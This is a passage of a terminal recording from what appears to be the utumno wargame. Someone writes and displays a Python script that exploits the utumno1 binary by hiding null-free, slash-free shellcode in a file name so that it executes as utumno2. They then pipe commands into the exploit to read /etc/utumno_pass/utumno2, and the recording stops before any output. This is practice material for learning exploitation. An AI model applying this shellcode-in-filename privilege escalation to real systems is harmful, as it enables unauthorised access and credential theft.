           \u001b[14;1H~                                                                                                   \u001b[15;1H~                                                                                                   \u001b[16;1H~                                                                                                   \u001b[17;1H~                                                                                                   \u001b[18;1H~                                                                                                   \u001b[19;1H~                                                                                                   \u001b[20;1H~                                                                                                   \u001b[21;1H~                                                                                                   \u001b[22;1H~                                                                                                   \u001b[23;1H~                                                                                                   \u001b[24;1H~                                                                                                   \u001b[25;1H~                                                                                                   \u001b[26;1H~                                                                                                   \u001b[27;1H~                                                                                                   \u001b[28;1H~                                                                                                   \u001b[29;1H~                                                                                                   \u001b[30;1H~                                                                                                   \u001b[31;1H~                                                                                                   \u001b[m\u001b[32;83H0,0-1\u001b[9CAll\u001b[1;1H\u001b[?25h\u001b[?4m\u001b[?25l\u001b[32;73Hi\u001b[1;1H\u001b[32;73H \u001b[1;1H\u001b[32;1H\u001b[1m-- INSERT --\u001b[m\u001b[32;83H\u001b[K\u001b[32;83H0,1\u001b[11CAll\u001b[1;1H\u001b[?25h\u001b[?25limport os, sys\u001b[2;1H\u001b[K\u001b[32;83H2\u001b[2;1H\u001b[?25h\u001b[?25l\u001b[3;1H\u001b[K\u001b[32;83H3\u001b[3;1H\u001b[?25h\u001b[?25l# ---------------------------------------------------------------------------\u001b[4;1H\u001b[K\u001b[32;83H4\u001b[4;1H\u001b[?25h\u001b[?25l# utumno1 takes a DIRECTORY argument and walks its entries.  For an entry\u001b[5;1H\u001b[K\u001b[32;83H"]
[0.000, "o", "5\u001b[5;1H\u001b[?25h\u001b[?25l# whose name starts with \"sh_\" it calls run(name+3), and run() does:\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25l#     strncpy(mmap_rwx_page, name+3, 0x1000);\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25l#     ((void (*)(void))mmap_rwx_page)();\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25l# so the file NAME is the payload.  Two hard constraints follow:\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25l#   * a file name cannot contain '/', so the shellcode cannot use the usual\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25l#     push 0x68732f2f / push 0x6e69622f trick for \"/bin/sh\";\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[?25l#   * strncpy stops at a NUL, so the shellcode cannot contain 0x00 either.\u001b[12;1H\u001b[K\u001b[32;84H2\u001b[12;1H\u001b[?25h\u001b[?25l# L1.asm builds \"/bin/sh\" byte by byte ('/' comes from 0x2e + 1) and raises\u001b[13;1H\u001b[K\u001b[32;84H3\u001b[13;1H\u001b[?25h\u001b[?25l# the uid to utumno2 with setreuid + setuid before execve.\u001b[14;1H\u001b[K\u001b[32;84H4\u001b[14;1H\u001b[?25h\u001b[?25l# ---------------------------------------------------------------------------\u001b[15;1H\u001b[K\u001b[32;84H5\u001b[15;1H\u001b[?25h\u001b[?25lsc = open(\"/tmp/ul1/l1.bin\", \"rb\").read()\u001b[16;1H\u001b[K\u001b[32;84H6\u001b[16;1H\u001b[?25h\u001b[?25lprint(\"shellcode: %d bytes, contains '/': %s, contains NUL: %s\"\u001b[17;1H\u001b[K\u001b[32;84H7\u001b[17;1H\u001b[?25h\u001b[?25l      % (len(sc), b\"/\" in sc, b\"\\x00\" in sc), flush=True)\u001b[18;1H\u001b[K\u001b[32;84H8\u001b[18;1H\u001b[?25h\u001b[?25l\u001b[19;1H\u001b[K\u001b[32;84H9\u001b[19;1H\u001b[?25h\u001b[?25lname = b\"sh_\" + sc\u001b[22C# d_name must start with sh_\u001b[20;1H\u001b[K\u001b[32;83H20\u001b[20;1H\u001b[?25h\u001b[?25ld = b\"/tmp/ul1/d\"\u001b[21;1H\u001b[K\u001b[32;84H1\u001b[21;1H\u001b[?25h\u001b[?25ltry:\u001b[22;1H\u001b[K\u001b[32;84H2\u001b[22;1H\u001b[?25h\u001b[?25l    os.mkdir(d)\u001b[23;1H\u001b[K\u001b[32;84H3\u001b[23;1H\u001b[?25h\u001b[?25lexcept FileExistsError:\u001b[24;1H\u001b[K\u001b[32;84H4\u001b[24;1H\u001b[?25h\u001b[?25l    pass\u001b[25;1H\u001b[K\u001b[32;84H5\u001b[25;1H\u001b[?25h\u001b[?25lfor f in os.listdir(d):\u001b[17C# only our entry may be there\u001b[26;1H\u001b[K\u001b[32;84H6\u001b[26;1H\u001b[?25h\u001b[?25l    os.unlink(os.path.join(d, f))\u001b[27;1H\u001b[K\u001b[32;84H7\u001b[27;1H\u001b[?25h\u001b[?25lopen(os.path.join(d, name), \"wb\").close()\u001b[28;1H\u001b[K\u001b[32;84H8\u001b[28;1H\u001b[?25h\u001b[?25lprint(\"created %s/%d-byte entry; it starts with sh_ so run() executes name+3\"\u001b[29;1H\u001b[K\u001b[32;84H9\u001b[29;1H\u001b[?25h\u001b[?25l      % (d.decode(), len(name)), flush=True)\u001b[30;1H\u001b[K\u001b[32;83H30\u001b[30;1H\u001b[?25h\u001b[?25l\u001b[31;1H\u001b[K\u001b[32;84H1\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[1;31r\u001b[31;1H\r\r\n\u001b[1;32r\u001b[30;1Hos.execve(b\"/utumno/utumno1\", [b\"/utumno/utumno1\", d], {})\u001b[32;83H\u001b[K\u001b[32;83H32,1\u001b[10CBot\u001b[31;1H\u001b[?25h\u001b[32;1H\u001b[K\u001b[?25l\u001b[32;83H32,0-1\u001b[8CBot\u001b[31;1H\u001b[?25h\u001b[?25l\u001b[32;83H\u001b[K\u001b[32;1H:wq\r\u001b[?2004l\u001b[>4;m\"e.py\" [New] 32L, 1450B written\r\u001b[23;2t\u001b[23;1t\r\r\r\n\u001b[?1004l\u001b[?2004l\u001b[?1l\u001b>\u001b[?1049l\u001b[23;0;0t\u001b[?25h\u001b[>4;m\u001b]3008;end=a93077ef-5652-49fc-9385-f9c7b84a5882;exit=success\u001b\\\u001b]3008;start=d1eb772f-8f05-4f8d-a335-3fe22a91bfe5;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/ul1\u001b\\\u001b[?2004h\u001b]0;utumno1@utumno: /tmp/ul1\u0007utumno1@utumno:/tmp/ul1$ "]
[0.253, "o", "cat e.py\r\r\n\u001b[?2004l\r\u001b]3008;start=881119b7-80e7-4117-8c93-af407ab71efd;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/ul1\u001b\\"]
[0.011, "o", "import os, sys\r\r\n\r\r\n# ---------------------------------------------------------------------------\r\r\n# utumno1 takes a DIRECTORY argument and walks its entries.  For an entry\r\r\n# whose name starts with \"sh_\" it calls run(name+3), and run() does:\r\r\n#     strncpy(mmap_rwx_page, name+3, 0x1000);\r\r\n#     ((void (*)(void))mmap_rwx_page)();\r\r\n# so the file NAME is the payload.  Two hard constraints follow:\r\r\n#   * a file name cannot contain '/', so the shellcode cannot use the usual\r\r\n#     push 0x68732f2f / push 0x6e69622f trick for \"/bin/sh\";\r\r\n#   * strncpy stops at a NUL, so the shellcode cannot contain 0x00 either.\r\r\n# L1.asm builds \"/bin/sh\" byte by byte ('/' comes from 0x2e + 1) and raises\r\r\n# the uid to utumno2 with setreuid + setuid before execve.\r\r\n# ---------------------------------------------------------------------------\r\r\nsc = open(\"/tmp/ul1/l1.bin\", \"rb\").read()\r\r\nprint(\"shellcode: %d bytes, contains '/': %s, contains NUL: %s\"\r\r\n      % (len(sc), b\"/\" in sc, b\"\\x00\" in sc), flush=True)\r\r\n\r\r\nname = b\"sh_\" + sc                      # d_name must start with sh_\r\r\nd = b\"/tmp/ul1/d\"\r\r\ntry:\r\r\n    os.mkdir(d)\r\r\nexcept FileExistsError:\r\r\n    pass\r\r\nfor f in os.listdir(d):                 # only our entry may be there\r\r\n    os.unlink(os.path.join(d, f))\r\r\nopen(os.path.join(d, name), \"wb\").close()\r\r\nprint(\"created %s/%d-byte entry; it starts with sh_ so run() executes name+3\"\r\r\n      % (d.decode(), len(name)), flush=True)\r\r\n\r\r\nos.execve(b\"/utumno/utumno1\", [b\"/utumno/utumno1\", d], {})\r\r\n\r\r\n"]
[0.011, "o", "\u001b]3008;end=881119b7-80e7-4117-8c93-af407ab71efd;exit=success\u001b\\\u001b]3008;start=d1eb772f-8f05-4f8d-a335-3fe22a91bfe5;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/ul1\u001b\\\u001b[?2004h\u001b]0;utumno1@utumno: /tmp/ul1\u0007utumno1@utumno:/tmp/ul1$ echo '=== step 9: run it; the shell it execs reads our stdin ==='\r\r\n\u001b[?2004l\r\u001b]3008;start=fe1e1def-3b56-47ae-b019-263a6c2dc838;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/ul1\u001b\\"]
[0.006, "o", "=== step 9: run it; the shell it execs reads our stdin ===\r\r\n\u001b]3008;end=fe1e1def-3b56-47ae-b019-263a6c2dc838;exit=success\u001b\\\u001b]3008;start=d1eb772f-8f05-4f8d-a335-3fe22a91bfe5;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=utumno1;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp/ul1\u001b\\\u001b[?2004h\u001b]0;utumno1@utumno: /tmp/ul1\u0007utumno1@utumno:/tmp/ul1$ "]
[0.170, "o", "printf 'id\\necho EUID=$EUID\\ncat /etc/utumno_pass/utumno2\\n' | timeout 10 python3 e.py\r\r\n\u001b[?2004l\r"]
